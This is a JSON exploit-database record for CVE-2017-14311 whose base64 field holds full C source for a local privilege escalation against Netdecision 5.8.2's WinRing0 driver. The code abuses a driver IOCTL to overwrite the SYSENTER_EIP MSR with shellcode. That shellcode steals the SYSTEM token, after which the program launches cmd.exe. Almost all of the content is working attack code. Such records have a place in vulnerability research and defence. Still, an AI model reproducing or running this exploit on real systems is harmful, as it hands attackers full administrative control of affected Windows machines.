{
    "source": "exploit-database", 
    "exploit": "Ly8gTmV0ZGVjaXNpb24uY3BwIDogRGVmaW5lcyB0aGUgZW50cnkgcG9pbnQgZm9yIHRoZSBjb25zb2xlIGFwcGxpY2F0aW9uLg0KLyoNCiMgRXhwbG9pdCBUaXRsZTogTmV0ZGVjaXNpb24gNS44LjIgLSBMb2NhbCBQcml2aWxlZ2UgRXNjYWxhdGlvbiAtIFdpbnJpbmcweDMyLnN5cw0KIyBEYXRlOiAyMDE3LjA5LjE3DQojIEV4cGxvaXQgQXV0aG9yOiBQZXRlciBCYXJpcw0KIyBWZW5kb3IgSG9tZXBhZ2U6IHd3dy5uZXRtZWNoYW5pY2EuY29tDQojIFNvZnR3YXJlIExpbms6IGh0dHA6Ly93d3cubmV0bWVjaGFuaWNhLmNvbS9kb3dubG9hZHMvICAvL3JlZ2lzdHJhdGlvbiByZXF1aXJlZA0KIyBWZXJzaW9uOiA1LjguMiANCiMgVGVzdGVkIG9uOiBXaW5kb3dzIDcgUHJvIFNQMSB4ODYgLyBXaW5kb3dzIDcgRW50ZXJwcmlzZSBTUDENCiMgQ1ZFIDogQ1ZFLTIwMTctMTQzMTEgDQoNClZlbmRvciBub3RpZmllZCBvbiAyMDE3LjA5LjExIC0gbm8gcmVzcG9uc2UgKi8NCg0KI2luY2x1ZGUgInN0ZGFmeC5oIg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8V2luZG93cy5oPg0KI2luY2x1ZGUgPHdpbmlvY3RsLmg+DQojaW5jbHVkZSA8dGxoZWxwMzIuaD4NCiNpbmNsdWRlIDxQc2FwaS5oPg0KDQojZGVmaW5lIERFVklDRV9OQU1FIEwiXFxcXC5cXFdpblJpbmcwXzFfMl8wIg0KDQoNCg0KTFBDVFNUUiBGaWxlTmFtZSA9IChMUENUU1RSKURFVklDRV9OQU1FOw0KSEFORExFIEdldERldmljZUhhbmRsZShMUENUU1RSIEZpbGVOYW1lKSB7DQoJSEFORExFIGhGaWxlID0gTlVMTDsNCg0KCWhGaWxlID0gQ3JlYXRlRmlsZShGaWxlTmFtZSwNCgkJR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwNCgkJMCwNCgkJMCwNCgkJT1BFTl9FWElTVElORywNCgkJTlVMTCwNCgkJMCk7DQoNCglyZXR1cm4gaEZpbGU7DQp9DQoNCg0KZXh0ZXJuIFVMT05HIFp3WWllbGRFeGVjdXRpb24gPSBOVUxMOw0KZXh0ZXJuIFBWT0lEIEtlcm5lbEJhc2VBZGRyZXNzSW5LZXJuZWxNb2RlID0gTlVMTDsNCmV4dGVybglITU9EVUxFIGhLZXJuZWxJblVzZXJNb2RlID0gTlVMTDsNCg0KVk9JRCBHZXRLaUZhc3RTeXN0ZW1DYWxsKCkgew0KDQoJU0laRV9UIFJldHVybkxlbmd0aDsNCglITU9EVUxFIGhudGRsbCA9IE5VTEw7DQoNCglVTE9ORyBad1lpZWxkRXhlY3V0aW9uX29mZnNldDsNCg0KDQoJaG50ZGxsID0gTG9hZExpYnJhcnlBKCJudGRsbC5kbGwiKTsNCg0KCWlmICghaG50ZGxsKSB7DQoJCXByaW50ZigiWy1dIEZhaWxlZCB0byBMb2FkIG50ZGxsLmRsbDogMHglWFxuIiwgR2V0TGFzdEVycm9yKCkpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJTFBWT0lEIGRyaXZlcnNbMTAyNF07DQoJRFdPUkQgY2JOZWVkZWQ7DQoNCglFbnVtRGV2aWNlRHJpdmVycyhkcml2ZXJzLCBzaXplb2YoZHJpdmVycyksICZjYk5lZWRlZCk7DQoJS2VybmVsQmFzZUFkZHJlc3NJbktlcm5lbE1vZGUgPSBkcml2ZXJzWzBdOw0KDQoNCglwcmludGYoIlsrXSBLZXJuZWwgYmFzZSBhZGRyZXNzOiAweCVYXG4iLCBLZXJuZWxCYXNlQWRkcmVzc0luS2VybmVsTW9kZSk7DQoJDQoJaEtlcm5lbEluVXNlck1vZGUgPSBMb2FkTGlicmFyeUEoIm50a3JubHBhLmV4ZSIpOw0KDQoJaWYgKCFoS2VybmVsSW5Vc2VyTW9kZSkgew0KCQlwcmludGYoIlstXSBGYWlsZWQgdG8gbG9hZCBrZXJuZWw6IDB4JVhcbiIsIEdldExhc3RFcnJvcigpKTsNCgkJZXhpdDsNCgl9DQoNCg0KCXByaW50ZigiWytdIEtlcm5lbEltYWdlIEJhc2UgaW4gVXNlci1Nb2RlIDB4JVhcclxuIiwgaEtlcm5lbEluVXNlck1vZGUpOw0KDQoJDQoJDQoNCglad1lpZWxkRXhlY3V0aW9uID0gR2V0UHJvY0FkZHJlc3MoaEtlcm5lbEluVXNlck1vZGUsICJad1lpZWxkRXhlY3V0aW9uIik7DQoJDQoJaWYgKCFad1lpZWxkRXhlY3V0aW9uKSB7DQoJCXByaW50ZigiWy1dIEZhaWxlZCB0byByZXNvbHZlIEtpRmFzdFN5c3RlbUNhbGw6IDB4JVhcbiIsIEdldExhc3RFcnJvcigpKTsNCgkJZXhpdDsNCgl9DQoJDQoJWndZaWVsZEV4ZWN1dGlvbl9vZmZzZXQgPSAoVUxPTkcpWndZaWVsZEV4ZWN1dGlvbiAtIChVTE9ORyloS2VybmVsSW5Vc2VyTW9kZTsNCglwcmludGYoIlsrXSBad1lpZWxkRXhlY3V0aW9uJ3Mgb2Zmc2V0IGFkZHJlc3MgaW4gbnRrcm5scGEuZXhlOiAweCVYXG4iLCBad1lpZWxkRXhlY3V0aW9uX29mZnNldCk7DQoNCg0KCShVTE9ORylad1lpZWxkRXhlY3V0aW9uID0gKFVMT05HKVp3WWllbGRFeGVjdXRpb25fb2Zmc2V0ICsgKFVMT05HKUtlcm5lbEJhc2VBZGRyZXNzSW5LZXJuZWxNb2RlOw0KDQoJcHJpbnRmKCJbK10gWndZaWVsZEV4ZWN1dGlvbidzIGFkZHJlc3MgaW4ga2VybmVsLW1vZGU6IDB4JVhcbiIsIFp3WWllbGRFeGVjdXRpb24pOw0KDQoNCglpZiAoaG50ZGxsKSB7DQoJCUZyZWVMaWJyYXJ5KGhudGRsbCk7DQoJfQ0KDQoJaWYgKGhLZXJuZWxJblVzZXJNb2RlKSB7DQoJCUZyZWVMaWJyYXJ5KGhLZXJuZWxJblVzZXJNb2RlKTsNCgl9DQoNCglobnRkbGwgPSBOVUxMOw0KDQoJcmV0dXJuIGhLZXJuZWxJblVzZXJNb2RlOw0KCXJldHVybiBad1lpZWxkRXhlY3V0aW9uOw0KfQ0KDQoNCmV4dGVybiBVTE9ORyBlaXAgPSBOVUxMOw0KZXh0ZXJuIFVMT05HIHBlc3AgPSBOVUxMOw0KZXh0ZXJuIFVMT05HIHBlYnAgPSBOVUxMOw0KZXh0ZXJuIFVMT05HIEVUSFJFQUQgPSBOVUxMOw0KDQpVTE9ORyBTaGVsbGNvZGUoKSB7DQoNCglVTE9ORyBGdW5jdGlvbkFkZHJlc3MgPSBad1lpZWxkRXhlY3V0aW9uOw0KCQ0KCV9fYXNtIHsNCg0KCQlwdXNoYWQNCgkJcHVzaGZkDQoJCXhvciBlYXgsZWF4DQoNCgkJbW92IGVkaSwgRnVuY3Rpb25BZGRyZXNzICA7IEFkZHJlc3Mgb2YgWndZaWVsZEV4ZWN0aW9uIHRvIEVESQ0KDQoJCVNlYXJjaENhbGw6DQoJCW1vdiBlYXgsIDB4ZTgNCgkJc2Nhc2INCgkJam56IFNlYXJjaENhbGwNCg0KCQltb3YgZWJ4LCBlZGkNCgkJbW92IGVjeCwgW2VkaV0NCgkJYWRkIGVieCwgZWN4OyBFQlggcG9pbnRzIHRvIEtpU3lzdGVtU2VydmljZQ0KCQlhZGQgZWJ4LCAweDQNCg0KCQlsZWEgZWRpLCBbZWJ4IC0gMHgxXQ0KCQlTZWFyY2hGYXN0Q2FsbEVudHJ5Og0KCQltb3YgZWF4LCAweDAwMDAwMDIzDQoJCXNjYXNkDQoJCWpueiBTZWFyY2hGYXN0Q2FsbEVudHJ5DQoJCW1vdiBlYXgsIDB4YTEwZjMwNmENCgkJc2Nhc2QNCgkJam56IFNlYXJjaEZhc3RDYWxsRW50cnkNCg0KCQlsZWEgZWF4LFtlZGktMHg5XQ0KCQl4b3IgZWR4LCBlZHgNCgkJbW92IGVjeCwgMHgxNzYNCg0KDQoJCXdybXNyDQoJCXBvcGZkDQoJCXBvcGFkDQoJCQkNCgkJDQoJCW1vdiBlYXgsRVRIUkVBRA0KCQkNCgkJbW92IGVheCxbZWF4XQ0KCQltb3YgZWF4LCBbZWF4KzB4MDUwXQ0KCQltb3YgZWN4LCBlYXgNCgkJbW92IGVkeCwgMHg0DQoJCQ0KCQlGaW5kU3lzdGVtUHJvY2VzcyA6DQoJCW1vdiBlYXgsIFtlYXggKyAweDBCOF0NCgkJc3ViIGVheCwgMHgwQjgNCgkJY21wW2VheCArIDB4MEI0XSwgZWR4DQoJCWpuZSBGaW5kU3lzdGVtUHJvY2Vzcw0KDQoJCQ0KCQltb3YgZWR4LCBbZWF4ICsgMHgwRjhdDQoJCW1vdltlY3ggKyAweDBGOF0sIGVkeA0KDQoJCTt4b3IgZWF4LCBlYXgNCgkJbW92IGVzcCxwZXNwDQoJCW1vdiBlYnAscGVicA0KCQ0KCQlwdXNoIGVpcA0KCTsJCWludCAzDQoJCXJldA0KCQkNCgl9DQoJDQp9DQoNCg0KDQppbnQgbWFpbigpDQp7DQoJSEFORExFIGhsaWIgPSBOVUxMOw0KCUhBTkRMRSBoRmlsZSA9IE5VTEw7DQoJUFZPSUQgbHBJbkJ1ZmZlciA9IE5VTEw7DQoJVUxPTkcgbHBPdXRCdWZmZXIgPSBOVUxMOw0KCVVMT05HIGxwQnl0ZXNSZXR1cm5lZDsNCglQVk9JRCBCdWZmQWRkcmVzcyA9IE5VTEw7DQoJU0laRV9UIEJ1ZmZlclNpemUgPSAweDEwMDA7DQoJU0laRV9UIG5PdXRCdWZmZXJTaXplID0gMHg4MDA7DQoJVUxPTkcgSW50ZXJ2YWwgPSAwOw0KCVVMT05HIFNoZWxsID0gJlNoZWxsY29kZTsNCglOVFNUQVRVUyBOdFN0YXR1cyA9IE5VTEw7DQoNCg0KCQ0KCS8qIFVuZG9jdW1lbnRlZCBmZWF0dXJlIHRvIHRyaWdnZXIgdGhlIHZ1bG5lcmFiaWxpdHkgKi8NCglobGliID0gTG9hZExpYnJhcnlBKCJudGRsbC5kbGwiKTsNCg0KCWlmICghaGxpYikgew0KCQlwcmludGYoIlstXSBGYWlsZWQgdG8gbG9hZCB0aGUgbGlicmFyeTogMHglWFxuIiwgR2V0TGFzdEVycm9yKCkpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCQ0KDQoJR2V0S2lGYXN0U3lzdGVtQ2FsbCgpOw0KCQ0KCS8qIEFsbG9jYXRlIG1lbW9yeSBmb3Igb3VyIGlucHV0IGFuZCBvdXRwdXQgYnVmZmVycyAqLw0KCWxwSW5CdWZmZXIgPSBWaXJ0dWFsQWxsb2MoTlVMTCwgQnVmZmVyU2l6ZSwgTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQoJDQoJLypHZXR0aW5nIEtpRmFzdFN5c3RlbUNhbGwgYWRkcmVzcyBmcm9tIG50ZGxsLmRsbCB0byByZXN0b3JlIGl0IGluIDB4MTc2IE1TUiovDQoJDQoNCglscE91dEJ1ZmZlciA9IFZpcnR1YWxBbGxvYyhOVUxMLCBCdWZmZXJTaXplLCBNRU1fQ09NTUlULCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCgkvL3ByaW50ZigiWytdIEFkZHJlc3MgdG8gd3JpdGUgb3VyIHNoZWxsY29kZSdzIGFkZHJlc3MgdG86IDB4JVhcclxuIiwgbHBPdXRCdWZmZXIpOw0KDQoNCgkvKiBDcmFmdGluZyB0aGUgaW5wdXQgYnVmZmVyICovDQoNCglCdWZmQWRkcmVzcyA9IChQVk9JRCkoKChVTE9ORylscEluQnVmZmVyKSk7DQoJKihQVUxPTkcpQnVmZkFkZHJlc3MgPSAoVUxPTkcpMHgwMDAwMDE3NjsgLypJQTMyX1NZU0VOVEVSX0VJUCBNU1IqLw0KCUJ1ZmZBZGRyZXNzID0gKFBWT0lEKSgoKFVMT05HKWxwSW5CdWZmZXIgKyAweDQpKTsNCgkqKFBVTE9ORylCdWZmQWRkcmVzcyA9IChVTE9ORylTaGVsbDsgLypPdXIgYXNzZW1ibHkgc2hlbGxjb2RlIFBvaW50ZXIgaW50byBFQVgqLw0KCUJ1ZmZBZGRyZXNzID0gKFBWT0lEKSgoKFVMT05HKWxwSW5CdWZmZXIgKyAweDgpKTsNCgkqKFBVTE9ORylCdWZmQWRkcmVzcyA9IChVTE9ORykweDAwMDAwMDAwOyAgLyogRURYIGlzIDB4MDAwMDAwMDAgaW4gMzJiaXQgbW9kZSAqLw0KCUJ1ZmZBZGRyZXNzID0gKFBWT0lEKSgoKFVMT05HKWxwSW5CdWZmZXIgKyAweGMpKTsNCgkqKFBVTE9ORylCdWZmQWRkcmVzcyA9IChVTE9ORykweDAwMDAwMDAwOw0KDQoNCgkvL1J0bEZpbGxNZW1vcnkobHBJbkJ1ZmZlciwgQnVmZmVyU2l6ZSwgMHg0MSk7DQoJLy9SdGxGaWxsTWVtb3J5KGxwT3V0QnVmZmVyLCBCdWZmZXJTaXplLCAweDQyKTsNCg0KCQ0KCS8vcHJpbnRmKCJbK10gVHJ5aW5nIHRoZSBnZXQgdGhlIGhhbmRsZSBmb3IgdGhlIFdpblJpbmcwXzFfMl8wIGRldmljZS5cclxuIik7DQoNCgloRmlsZSA9IEdldERldmljZUhhbmRsZShGaWxlTmFtZSk7DQoNCglpZiAoaEZpbGUgPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpIHsNCgkJcHJpbnRmKCJbLV0gQ2FuJ3QgZ2V0IHRoZSBkZXZpY2UgaGFuZGxlLiAweCVYXHJcbiIsIEdldExhc3RFcnJvcigpKTsNCgkJcmV0dXJuIDE7DQoJfQ0KCWVsc2UNCgl7DQoJCXByaW50ZigiWytdIEhhbmRsZSBvcGVuZWQgZm9yIFdpblJpbmcweDMyLiBTZW5kaW5nIElPQ1RMLlxyXG4iKTsNCgl9DQoJDQoJLypIZXJlIHdlIGNhbGN1bGF0ZSB0aGUgRUlQIGZvciBvdXIgcmV0dXJuIGZyb20ga2VybmVsLW1vZGUuIFRoaXMgZXhwbG9pdCBkb2VzIG5vdCBsZXQgdXMgc2ltcGx5IGFkanVzdCB0aGUgc3RhY2sgYW5kIHJldHVybiovDQoNCgkoSEFORExFKWVpcCA9IEdldE1vZHVsZUhhbmRsZUEoTlVMTCk7IC8qR2V0dGluZyB0aGUgYmFzZSBhZGRyZXNzIG9mIG91ciBwcm9jZXNzKi8NCglwcmludGYoIlsrXSBDdXJyZW50IHByb2Nlc3MgYmFzZSBhZGRyZXNzIDB4JVhcclxuIiwgKEhBTkRMRSllaXApOw0KCShIQU5ETEUpZWlwID0gZWlwICsgMHgxM2FlOyAvKkFueSB0aW1lIHlvdSBjaGFuZ2Ugc29tZXRoaW5nIGluIHRoZSBtYWluKCkgc2VjdGlvbiB5b3UgTVVTVCBhZGp1c3QgdGhlIG9mZnNldCB0byBwb2ludCB0byB0aGUgUFVTSCA0MCBpbnN0cmN0aW9uKi8NCglwcmludGYoIlsrXSBSZXR1cm4gYWRkcmVzcyAoRUlQKSBmcm9tIGtlcm5lbC1tb2RlIDB4JVhcclxuIiwgKEhBTkRMRSllaXApOw0KDQoJLypTZXR0aW5nIENQVSBhZmZpbml0eSBiZWZvcmUgZXhlY3V0aW9uIHRvIG1heGltaXplIHRoZSBjaGFuY2Ugb2YgZXhlY3V0aW5nIG91ciBjb2RlIG9uIHRoZSBzYW1lIENQVSBjb3JlKi8NCglEV09SRF9QVFIgaSA9IDE7IC8qQ1BVIENvcmUgd2l0aCBJRCAxIHdpbGwgYmUgYWx3YXlzIGNob3NlbiBmb3IgdGhlIGV4ZWN1dGlvbiovDQoNCglVTE9ORyBhZmZpbml0eSA9IFNldFRocmVhZEFmZmluaXR5TWFzayhHZXRDdXJyZW50VGhyZWFkKCksIGkpOw0KDQoJcHJpbnRmKCJbK10gU2V0dGluZyBhZmZpbml0eSBmb3IgbG9naWNhbCBDUFUgd2l0aCBJRDolZFxyXG4iLCBpKTsNCgkJaWYgKGFmZmluaXR5ID09IE5VTEwpIHsNCg0KCQkJcHJpbnRmKCJbLV0gU29tZXRoaW5nIHdlbnQgd3Jvbmcgd2hpbGUgc2V0dGluZyBDUFUgYWZmaW5pdHkgMHglWFxyXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQoJCQlleGl0KDEpOw0KCQl9DQoJDQoJRVRIUkVBRCA9IChVTE9ORylLZXJuZWxCYXNlQWRkcmVzc0luS2VybmVsTW9kZSArIDB4MTJiZDI0OyAvKk9mZnNldCB0byBudCFLaUluaXRpYWxUaHJlYWQgYXMgVEVCIGlzIG5vdCByZWFkYWJsZSovDQoNCgkvKlNhdmluZyBzdGFjayBwb2ludGVyIGFuZCBzdGFjayBmcmFtZSBvZiB1c2VyLW1vZGUgYmVmb3JlIGRpdmluZyBpbiBrZXJuZWwtbW9kZSB0byByZXN0b3JlIGl0IGJlZm9yZSByZXR1cm5pbmcgdG8gdXNlci1tb2RlICovDQoNCglfX2FzbSB7DQoJCQ0KCQltb3YgcGVzcCwgZXNwDQoJCW1vdiBwZWJwLCBlYnANCgkJbm9wDQoJfQ0KCQ0KDQoJRGV2aWNlSW9Db250cm9sKGhGaWxlLA0KCQkweDlDNDAyMDg4LCANCgkJbHBJbkJ1ZmZlciwNCgkJMHgxMCwNCgkJbHBPdXRCdWZmZXIsIA0KCQkweDIwLCAgDQoJCSZscEJ5dGVzUmV0dXJuZWQsDQoJCU5VTEwpOw0KCQ0KCQ0KDQoJCVNUQVJUVVBJTkZPIGluZm8gPSB7IHNpemVvZihpbmZvKSB9Ow0KCQlQUk9DRVNTX0lORk9STUFUSU9OIHByb2Nlc3NJbmZvOw0KCQlOVFNUQVRVUyBwcm9jOw0KCQlMUENTVFIgY29tbWFuZCA9IEwiQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbWQuZXhlIjsNCgkJcHJvYyA9IENyZWF0ZVByb2Nlc3MoY29tbWFuZCwgTlVMTCwgTlVMTCwgTlVMTCwgRkFMU0UsIDAsIE5VTEwsIE5VTEwsICZpbmZvLCAmcHJvY2Vzc0luZm8pOw0KDQoJCWlmICghcHJvYykgew0KCQ0KCQkJcHJpbnRmKCJFUlJPUiAweCVYXHJcbiIsIHByb2MpOw0KCQl9DQoJCVdhaXRGb3JTaW5nbGVPYmplY3QocHJvY2Vzc0luZm8uaFByb2Nlc3MsIElORklOSVRFKTsNCgkNCg0KCWV4aXQoMCk7DQp9DQoNCg==", 
    "filename": "platforms/windows/local/42735.c", 
    "id": "42735", 
    "cves": [
        "CVE-2017-14311"
    ]
}